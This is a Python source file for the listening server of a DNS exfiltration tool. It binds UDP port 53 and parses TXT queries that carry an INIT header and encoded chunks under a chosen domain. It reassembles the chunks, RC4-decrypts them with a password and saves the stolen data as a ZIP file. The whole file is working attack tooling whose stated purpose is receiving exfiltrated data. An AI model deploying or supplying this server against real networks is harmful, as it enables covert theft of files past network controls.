#!/usr/bin/python3
# -*- coding: utf8 -*-
import argparse
import socket
from dnslib import *
from base64 import b64decode, b32decode
import sys
import os
import time

#======================================================================================================
#                                                                                       HELPERS FUNCTIONS
#======================================================================================================

#------------------------------------------------------------------------
# Class providing RC4 encryption/decryption functions (Python3-safe)
#------------------------------------------------------------------------
class RC4:
    def __init__(self, key=None):
        # use list(range(...)) so swaps work
        self.state = list(range(256))
        self.x = 0
        self.y = 0

        if key is not None:
            self.key = key
            self.init(key)

    # Key schedule
    def init(self, key):
        self.x = 0
        self.y = 0
        for i in range(256):
            self.x = (ord(key[i % len(key)]) + self.state[i] + self.x) & 0xFF
            self.state[i], self.state[self.x] = self.state[self.x], self.state[i]
        self.x = 0
        self.y = 0

    # Decrypt binary input data
    def binaryDecrypt(self, data):
        # data: bytes or bytearray
        output = bytearray(len(data))
        for i in range(len(data)):
            self.x = (self.x + 1) & 0xFF
            self.y = (self.state[self.x] + self.y) & 0xFF
            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]
            output[i] = (data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF])
        return bytes(output)

#------------------------------------------------------------------------
def progress(count, total, status=''):
    """
    Print a progress bar
    """
    bar_len = 60
    filled_len = int(round(bar_len * count / float(total))) if total else (bar_len if count else 0)

    percents = round(100.0 * count / float(total), 1) if total else (100.0 if count else 0.0)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)
    sys.stdout.write('[%s] %s%s\t%s\t\r' % (bar, percents, '%', status))
    sys.stdout.flush()

#------------------------------------------------------------------------
def fromBase64URL(msg):
    # msg: str -> returns bytes
    msg2 = msg.replace('_','/').replace('-','+')
    # pad
    pad = (-len(msg2)) % 4
    if pad:
        msg2 = msg2 + ('=' * pad)
    return b64decode(msg2)

#------------------------------------------------------------------------
def fromBase32(msg):
    # msg: str -> returns bytes
    mod = len(msg) % 8
    if mod == 2:
        padding = "======"
    elif mod == 4:
        padding = "===="
    elif mod == 5:
        padding = "==="
    elif mod == 7:
        padding = "="
    else:
        padding = ""
    return b32decode(msg.upper() + padding)

#------------------------------------------------------------------------
def decode_base64_flexible(msg):
    """
    Try Base64URL then standard Base64 (with/without padding).
    Returns bytes or raises Exception.
    """
    # try URL-safe first
    try:
        return fromBase64URL(msg)
    except Exception:
        pass

    # try standard base64 with padding fix
    try:
        pad = (-len(msg)) % 4
        msg2 = msg + ('=' * pad)
        return b64decode(msg2)
    except Exception as e:
        raise e

#------------------------------------------------------------------------
def color(string, color=None):
    """
    Change text color for the Linux terminal.
    """
    attr = []
    attr.append('1')  # bold
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
    else:
        if string.strip().startswith("[!]"):
            attr.append('31'); return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[+]"):
            attr.append('32'); return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[?]"):
            attr.append('33'); return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[*]"):
            attr.append('34'); return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string

#======================================================================================================
#                                                                                       MAIN FUNCTION
#======================================================================================================
if __name__ == '__main__':

    #------------------------------------------------------------------------
    # Parse arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", help="The domain name used to exfiltrate data", dest="domainName", required=True)
    parser.add_argument("-p", "--password", help="The password used to encrypt/decrypt exfiltrated data", dest="password", required=True)
    args = parser.parse_args()

    # Setup a UDP server listening on port UDP 53
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udps.bind(('',53))
    print(color("[*] DNS server listening on port 53"))

    try:
        useBase32 = False
        chunkIndex = 0
        fileData = ''
        nbChunks = 0
        fileName = "output"
        saved = False

        while True:
            data, addr = udps.recvfrom(4096)
            request = DNSRecord.parse(data)

            # Only care about TXT-like queries (type 16)
            if request.q.qtype == 16:
                qname = str(request.q.qname)
                # DEBUG: show qname and sender
                #print(color("[*] Received from {}: {}".format(addr, qname)))

                # INIT.<payload>.<encoding>.<domain>
                if qname.upper().startswith("INIT."):
                    msgParts = qname.split(".")
                    # Sanity check
                    if len(msgParts) < 3:
                        print(color("[!] Malformed INIT qname: {}".format(qname)))
                        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                        reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("ERR")))
                        udps.sendto(reply.pack(), addr)
                        continue

                    encoded = msgParts[1]
                    encoding_hint = msgParts[2] if len(msgParts) > 2 else ''

                    # decode to bytes depending on hint
                    try:
                        if encoding_hint.upper() == "BASE32":
                            msg_bytes = fromBase32(encoded)
                            useBase32 = True
                            print(color("[+] Data was encoded using Base32"))
                        else:
                            # try to decode flexible Base64 (handles base64 and base64url)
                            msg_bytes = decode_base64_flexible(encoded)
                            useBase32 = False
                            print(color("[+] Data was encoded using Base64 / Base64URL (detected)"))
                    except Exception as e:
                        print(color("[!] Failed to decode INIT payload: {}".format(e)))
                        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                        reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("ERR")))
                        udps.sendto(reply.pack(), addr)
                        continue

                    # decode bytes to string safely for parsing filename|nbchunks
                    try:
                        msg = msg_bytes.decode('utf-8')
                    except UnicodeDecodeError:
                        msg = msg_bytes.decode('latin1')  # fallback

                    parts = msg.split('|')
                    if len(parts) >= 2:
                        fileName = parts[0]
                        try:
                            nbChunks = int(parts[1])
                        except Exception:
                            nbChunks = 0
                    else:
                        fileName = "output"
                        nbChunks = 0

                    # Reset variables
                    fileData = ''
                    chunkIndex = 0
                    saved = False

                    print(color("[+] Receiving file [{}] as a ZIP file in [{}] chunks".format(fileName, nbChunks)))

                    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                    reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("OK")))
                    udps.sendto(reply.pack(), addr)

                else:
                    # Normal data chunk. Remove trailing ".<domain>" from qname
                    # qname is like: <chunknum>.<encoded>.<domain>.
                    # We remove the trailing domain label(s) matching provided domainName
                    if qname.endswith("." + args.domainName + "."):
                        msg = qname[0:-(len(args.domainName) + 2)]
                    else:
                        msg = qname.rstrip('.')

                    # Now split into chunkNumber and rawData
                    if '.' in msg:
                        try:
                            chunkNumber_str, rawData = msg.split('.', 1)
                        except ValueError:
                            chunkNumber_str = '-1'
                            rawData = ''
                    else:
                        chunkNumber_str = '-1'
                        rawData = ''

                    # Sanitize chunkNumber (some tools send padded numbers like 00001)
                    try:
                        chunkNumber = int(chunkNumber_str)
                    except Exception:
                        chunkNumber = -1

                    # DEBUG: show chunk info
                    #print(color("[*] Chunk parsed: num={} raw_len={} raw_preview={}".format(chunkNumber, len(rawData), rawData[:80])))

                    if chunkNumber >= 0:
                        # Append incoming chunk regardless of order if it isn't empty,
                        # but keep order-based increment behavior too.
                        if rawData:
                            fileData += rawData.replace('.','')

                        # If chunk matches expected index, increment; otherwise still track received chunks
                        if chunkNumber == chunkIndex:
                            chunkIndex += 1

                        progress(chunkIndex, nbChunks, "Receiving file")

                        # Acknowledge with the chunk number (or -1 if malformed)
                        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                        reply_text = str(chunkNumber) if chunkNumber >= 0 else "ERR"
                        reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(reply_text)))
                        udps.sendto(reply.pack(), addr)

                        # If received all chunks (normal case), attempt to decrypt and write file
                        if nbChunks and (chunkIndex >= nbChunks):
                            print('\n')
                            try:
                                rc4Decryptor = RC4(args.password)
                                outputFileName = fileName + ".zip"
                                outputPath = os.path.abspath(outputFileName)
                                print(color("[+] Decrypting using password [{}] and saving to output file [{}]".format(args.password, outputPath)))
                                with open(outputPath, 'wb+') as fileHandle:
                                    if useBase32:
                                        decoded_bytes = fromBase32(fileData)
                                    else:
                                        decoded_bytes = decode_base64_flexible(fileData)
                                    plaintext = rc4Decryptor.binaryDecrypt(bytearray(decoded_bytes))
                                    fileHandle.write(plaintext)
                                print(color("[+] Output file [{}] saved successfully".format(outputPath)))
                                saved = True
                                # reset nbChunks to avoid repeated writes
                                nbChunks = 0
                            except IOError:
                                print(color("[!] Could not write file [{}]".format(outputFileName)))
                            except Exception as e:
                                print(color("[!] Error processing file: {}".format(e)))

            else:
                # Query type is not TXT - reply empty (or you can ignore)
                reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                udps.sendto(reply.pack(), addr)

    except KeyboardInterrupt:
        # User requested stop - we'll attempt to save any data received (tolerant mode)
        print()
        if fileData and (not saved):
            try:
                print(color("[*] Ctrl-C received - attempting to save collected data (tolerant mode)"))
                rc4Decryptor = RC4(args.password)
                outputFileName = fileName + ".zip"
                outputPath = os.path.abspath(outputFileName)
                print(color("[+] Decrypting using password [{}] and saving to output file [{}]".format(args.password, outputPath)))
                with open(outputPath, 'wb+') as fileHandle:
                    if useBase32:
                        decoded_bytes = fromBase32(fileData)
                    else:
                        decoded_bytes = decode_base64_flexible(fileData)
                    plaintext = rc4Decryptor.binaryDecrypt(bytearray(decoded_bytes))
                    fileHandle.write(plaintext)
                print(color("[+] Output file [{}] saved successfully".format(outputPath)))
            except Exception as e:
                print(color("[!] Failed to save on exit: {}".format(e)))
        pass
    finally:
        print(color("[!] Stopping DNS Server"))
        udps.close()
